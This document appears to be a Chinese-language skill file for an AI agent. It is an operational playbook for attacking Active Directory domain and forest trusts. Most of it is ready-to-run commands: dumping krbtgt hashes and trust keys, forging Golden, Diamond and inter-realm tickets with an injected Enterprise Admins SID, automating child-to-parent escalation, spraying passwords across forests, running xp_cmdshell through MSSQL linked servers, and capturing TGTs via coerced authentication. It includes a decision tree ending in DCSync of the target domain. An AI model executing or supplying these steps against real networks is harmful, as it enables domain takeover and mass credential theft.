---
name: ad-trust-attack
description: "域信任关系攻击。当目标存在多域/多林环境时使用。包含父子域提权（Golden Ticket + ExtraSid）、跨林攻击（SID History/MSSQL Trust Links）、单向信任利用。已获取子域 Domain Admin 或发现信任关系时优先加载。"
metadata:
  tags: "domain-trust,forest-trust,child-parent,extrasid,sid-filtering,golden-ticket,diamond-ticket,raiseChild,cross-forest,trust-enumeration,kerberos"
  category: "lateral"
---

# 域信任关系攻击

枚举和利用 Active Directory 信任关系，实现跨域和跨林的横向移动与权限提升。

## 触发条件

- 已获得子域 Domain Admin 或 krbtgt 哈希，需提升至父域
- 枚举发现域间/林间信任关系
- 目标环境存在多域或多林架构
- 需要跨信任边界横向移动

## 前置要求

- 当前域的高权限凭据 (Domain Admin / krbtgt hash / 信任密钥)
- 已完成信任关系枚举或已知信任拓扑
- 工具: ticketer.py, raiseChild.py, secretsdump.py, lookupsid.py, Rubeus, ldeep, NetExec

---

## Phase 1: 信任关系枚举

```bash
ldeep ldap -u <USER> -p <PASSWORD> -d <DOMAIN> -s ldap://<DC> trusts
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_trusts
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c Trusts
```

```powershell
Get-DomainTrust                              # PowerView
Get-ForestTrust                              # 森林信任
nltest /domain_trusts /all_trusts            # Windows 原生
```

### 输出解读

| 字段 | 含义 |
|------|------|
| TrustDirection: Bidirectional | 双向信任，可双向访问 |
| TrustDirection: Inbound | 对方信任我们，我们可访问对方 |
| TrustDirection: Outbound | 我们信任对方，对方可访问我们 |
| TrustAttributes: WITHIN_FOREST | 森林内，无 SID 过滤 |
| TrustAttributes: FOREST_TRANSITIVE | 森林信任，有 SID 过滤 |

---

## Phase 2: 信任类型与攻击面分析

### 信任类型速查

| 信任类型 | 方向 | SID 过滤 | 主要攻击方式 |
|----------|------|----------|-------------|
| **父子域 (Parent-Child)** | 双向 | 禁用 | Golden Ticket + ExtraSid |
| **树根 (Tree-Root)** | 双向 | 禁用 | Golden Ticket + ExtraSid |
| **外部 (External)** | 单向 | 启用 | 外部组成员 / 密码重用 |
| **森林 (Forest)** | 双向 | 启用 | SID History(受限) / MSSQL Links |

### 关键信任属性

| 属性 | 值 | 安全含义 |
|------|-----|---------|
| WITHIN_FOREST | 0x20 | 森林内，无 SID 过滤 |
| FOREST_TRANSITIVE | 0x08 | 森林信任，有 SID 过滤 |
| TREAT_AS_EXTERNAL | 0x40 | 视为外部，启用 SID 过滤 |
| QUARANTINED_DOMAIN | 0x04 | 域隔离，强制 SID 过滤 |

### SID 过滤影响

| 信任类型 | ExtraSid 攻击 | 备注 |
|----------|--------------|------|
| 森林内 (WITHIN_FOREST) | 完全可用 | Enterprise Admins (-519) 有效 |
| 外部/森林信任 | 仅 RID > 1000 | 知名 SID 被过滤 |
| 隔离域 (Quarantined) | 极度受限 | 几乎全部被过滤 |

---

## Phase 3: 子域到父域提权

**核心原理**: 同一森林内无 SID 过滤，子域 krbtgt 签发的票据中可注入父域 Enterprise Admins SID (-519)。

### 3.1 获取必要信息

```bash
# 获取子域 SID
lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC> 0

# 获取父域 SID (Enterprise Admins = 父域SID + "-519")
lookupsid.py <CHILD_DOMAIN>/<USER>:<PASSWORD>@<PARENT_DC> 0

# 转储子域 krbtgt 哈希
secretsdump.py -just-dc-user '<CHILD_DOMAIN>/krbtgt' \
  '<CHILD_DOMAIN>/<USER>:<PASSWORD>@<CHILD_DC>'
```

### 3.2 Golden Ticket + ExtraSid

```bash
ticketer.py -nthash <KRBTGT_NTHASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -extra-sid '<PARENT_SID>-519' \
  fakeadmin

export KRB5CCNAME=fakeadmin.ccache
secretsdump.py -k -no-pass <PARENT_DOMAIN>/fakeadmin@<PARENT_DC>
```

```powershell
# Rubeus (AES256 更隐蔽)
Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator \
  /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<PARENT_SID>-519 /nowrap
```

### 3.3 Diamond Ticket 变体

修改合法 TGT 的 PAC 而非从零伪造，绕过部分检测:

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
  /groups:519 /sids:<PARENT_SID>-519 /krbkey:<KRBTGT_AES256> /nowrap
```

### 3.4 raiseChild.py 自动化

```bash
raiseChild.py -target-exec <PARENT_DC> '<CHILD_DOMAIN>/Administrator:<PASSWORD>'
raiseChild.py -target-exec <PARENT_DC> -hashes :<NTHASH> '<CHILD_DOMAIN>/Administrator'
```

### 3.5 Trust Ticket (Inter-Realm TGT)

```bash
# 转储信任密钥
secretsdump.py '<CHILD_DOMAIN>/Administrator:<PASSWORD>@<CHILD_DC>' | grep -i trust

# 伪造跨域 TGT
ticketer.py -nthash <TRUST_KEY_HASH> \
  -domain-sid '<CHILD_SID>' \
  -domain <CHILD_DOMAIN> \
  -spn krbtgt/<PARENT_DOMAIN> \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
getST.py -k -no-pass -spn cifs/<PARENT_DC>.<PARENT_DOMAIN> <PARENT_DOMAIN>/fakeuser
```

> 详细步骤与方法对比 -> [references/child-parent-escalation.md](references/child-parent-escalation.md)

---

## Phase 4: 单向信任利用

### 4.1 入站信任 (Inbound)

外部域信任我们，我们的用户可以访问外部域资源。

```powershell
# 查找外部域中的本域用户/组
Get-DomainForeignGroupMember -Domain <EXTERNAL_DOMAIN>
ConvertFrom-SID S-1-5-21-<MEMBER_SID>
```

```powershell
# 跨域票据请求
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256> /nowrap
Rubeus.exe asktgs /service:krbtgt/<EXTERNAL_DOMAIN> /domain:<DOMAIN> \
  /dc:<DC> /ticket:<TGT_BASE64> /nowrap
Rubeus.exe asktgs /service:cifs/<EXTERNAL_DC> /domain:<EXTERNAL_DOMAIN> \
  /dc:<EXTERNAL_DC> /ticket:<REFERRAL_TICKET> /nowrap
```

### 4.2 出站信任 (Outbound)

我们信任外部域，可获取信任密钥进行进一步利用。

```powershell
# 转储信任密钥
mimikatz lsadump::trust /patch
```

```bash
# DCSync 信任账户
secretsdump.py -just-dc-user '<EXTERNAL_DOMAIN>$' \
  '<DOMAIN>/Administrator:<PASSWORD>@<DC>'

# 使用信任账户身份进行 Kerberoast 等攻击
Rubeus.exe asktgt /user:<DOMAIN>$ /domain:<EXTERNAL_DOMAIN> /rc4:<TRUST_KEY> /nowrap
```

---

## Phase 5: 跨林攻击

**场景**: 森林信任存在 SID 过滤，需要替代攻击路径。

### 5.1 SID History (受限)

```bash
# 在目标林找 RID > 1000 有价值组，创建 Golden Ticket 注入其 SID
ticketer.py -nthash <KRBTGT_HASH> \
  -domain-sid '<SOURCE_SID>' \
  -domain <SOURCE_DOMAIN> \
  -extra-sid '<TARGET_SID>-1111' \
  fakeuser

export KRB5CCNAME=fakeuser.ccache
smbclient.py -k -no-pass <TARGET_DOMAIN>/fakeuser@<TARGET_DC>
```

### 5.2 外部组成员

```powershell
Get-DomainForeignGroupMember -Domain <TARGET_FOREST>
Get-DomainForeignUser -Domain <TARGET_FOREST>
```

### 5.3 密码重用

```bash
netexec smb <TARGET_DC> -u '<USER>' -p '<PASSWORD>' -d '<TARGET_FOREST>'
netexec smb <TARGET_DC> -u users.txt -p passwords.txt -d '<TARGET_FOREST>'
```

### 5.4 MSSQL Linked Server

```sql
-- 枚举链接服务器
SELECT * FROM master..sysservers;

-- 在链接服务器上执行
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER];

-- 链式穿越
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND_LINK]') AT [FIRST_LINK];

-- 通过链接执行命令 (需 xp_cmdshell)
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

### 5.5 非约束委派跨域

```bash
# 查找非约束委派 → 强制目标林 DC 认证 → 捕获 TGT
Get-DomainComputer -Unconstrained -Domain <SOURCE_DOMAIN>
Rubeus.exe monitor /interval:5 /nowrap /filteruser:<TARGET_DC>$
# 触发: PrinterBug / PetitPotam / DFSCoerce
Rubeus.exe ptt /ticket:<CAPTURED_TGT>
```

### 5.6 跨信任 ACL 滥用

```powershell
Get-DomainObjectAcl -Domain <TARGET_FOREST> |
  Where-Object {$_.SecurityIdentifier -match 'S-1-5-21-<SOURCE_SID>'}
```

> 详细攻击手法与实战案例 -> [references/cross-forest-attack.md](references/cross-forest-attack.md)

---

## 决策树

```
[开始] 发现域信任关系 / 已获取子域 DA
    │
    ├─ 枚举: ldeep / NetExec / PowerView / BloodHound / nltest
    │
    ▼
[分析] 信任类型?
    │
    ├─ WITHIN_FOREST (父子域/树根) ───────────────────────┐
    │   └─ 无 SID 过滤                                     │
    │       ├─ 有 krbtgt ── Golden Ticket + ExtraSid(-519) ┤
    │       ├─ 需隐蔽 ──── Diamond Ticket ─────────────────┤
    │       ├─ 要快速 ──── raiseChild.py ──────────────────┤
    │       └─ 有信任密钥 ─ Trust Ticket ──────────────────┤
    │                                                       ▼
    │                                              获取父域 DA → DCSync
    │
    ├─ FOREST_TRANSITIVE (森林信任) ──────────────────────┐
    │   └─ 有 SID 过滤 (RID > 1000 可通过)                │
    │       ├─ RID>1000 组 ── SID History ────────────────┤
    │       ├─ 外部组成员 ── 已授权跨林访问 ──────────────┤
    │       ├─ 密码重用 ──── netexec 喷洒 ────────────────┤
    │       ├─ MSSQL 链接 ── xp_cmdshell ────────────────┤
    │       └─ 非约束委派 ── 跨林 TGT 捕获 ──────────────┤
    │                                                      ▼
    │                                              跨林访问
    │
    ├─ Inbound (对方信任我们) ────────────────────────────┐
    │   ├─ 查找外部组成员 ── ForeignGroupMember ──────────┤
    │   └─ 跨域票据请求 ──── Rubeus asktgt/asktgs ───────┤
    │                                                      ▼
    │                                              访问外部域
    │
    └─ Outbound (我们信任对方) ──────────────────────────┐
        ├─ 转储信任密钥 ──── lsadump::trust / DCSync ────┤
        └─ 信任账户登录 ──── Kerberoast 目标域 ──────────┤
                                                           ▼
                                                   目标域立足点
```

---

## 验证清单

- [ ] 枚举所有信任关系 (类型、方向、属性)
- [ ] 确定 SID 过滤状态 (WITHIN_FOREST vs FOREST_TRANSITIVE)
- [ ] 获取所需凭据 (krbtgt hash / 信任密钥 / DA 密码)
- [ ] 根据信任类型选择攻击方法
- [ ] 执行跨域/跨林攻击并验证访问
- [ ] DCSync 目标域获取完整凭据

---

## 常见问题

### ExtraSid 攻击失败

1. 确认是森林内信任 (WITHIN_FOREST=0x20)，外部/森林信任会过滤 -519
2. 检查 krbtgt hash 是否正确，域 SID 是否匹配

### raiseChild.py 失败

1. 确认有子域 DA 权限且可 DCSync
2. 检查到父域 DC 的网络连通性
3. 手动分步: lookupsid -> secretsdump -> ticketer

### 跨林 SID History 不生效

1. 确认目标组 RID > 1000 (知名 SID 被过滤)
2. 检查信任上是否启用 SID History (默认禁用)

---

## 工具参考

| 工具 | 用途 |
|------|------|
| ldeep / NetExec / BloodHound | 信任枚举与可视化 |
| lookupsid.py | 域 SID 查询 |
| secretsdump.py | krbtgt / 信任密钥转储 |
| ticketer.py | Golden Ticket / Trust Ticket |
| raiseChild.py | 自动化子域到父域提权 |
| Rubeus / mimikatz | Windows 票据操作与密钥转储 |
